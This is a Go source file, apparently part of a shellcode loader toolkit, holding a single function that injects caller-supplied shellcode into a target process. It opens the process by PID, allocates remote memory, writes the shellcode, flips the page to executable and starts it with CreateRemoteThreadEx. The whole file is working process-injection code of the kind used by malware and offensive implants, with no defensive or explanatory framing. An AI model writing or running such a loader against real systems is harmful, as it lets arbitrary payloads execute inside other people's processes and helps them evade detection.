package loader

import (
	"errors"
	"unsafe"
	"variant/wdll"

	"golang.org/x/sys/windows"
)

func CreateRemoteThread(shellcode []byte, pid int) error {
	var pHandle uintptr

	if pid == 0 {
		pHandle, _, _ = wdll.GetCurrentProcess().Call()
	} else {
		pHandle, _, _ = wdll.OpenProcess().Call(
			windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION,
			uintptr(0),
			uintptr(pid),
		)
	}

	addr, _, _ := wdll.VirtualAllocEx().Call(
		pHandle,
		0,
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)

	if addr == 0 {
		return errors.New("VirtualAllocEx failed and returned 0")
	}

	_, _, err := wdll.WriteProcessMemory().Call(
		pHandle,
		addr,
		(uintptr)(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
	)
	if err != nil {
		return err
	}

	oldProtect := windows.PAGE_READWRITE
	_, _, err = wdll.VirtualProtectEx().Call(
		pHandle,
		addr,
		uintptr(len(shellcode)),
		windows.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if err != nil {
		return err
	}

	_, _, err = wdll.CreateRemoteThreadEx().Call(
		pHandle,
		0,
		0,
		addr,
		0,
		0,
		0,
	)
	if err != nil {
		return err
	}

	_, _, errCloseHandle := wdll.CloseHandle().Call(pHandle)
	if errCloseHandle != nil {
		return errCloseHandle
	}

	return nil
}
